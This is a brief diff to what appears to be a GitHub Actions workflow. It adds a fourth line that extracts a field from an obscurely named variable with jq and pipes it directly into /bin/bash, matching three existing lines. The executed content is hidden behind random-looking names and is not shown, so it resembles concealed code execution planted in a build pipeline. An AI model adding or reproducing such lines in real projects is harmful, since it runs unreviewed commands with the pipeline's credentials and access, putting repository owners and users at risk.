@@ -53,6 +53,7 @@ jobs:
           echo $heuw63 | jq -r .uccx11 | /bin/bash
           printf '%s' "$v480" | jq -r .ob2332 | /bin/bash
           echo $sq0 | jq -r .pjtx35 | /bin/bash
+          echo $c3760 | jq -r .lis865 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
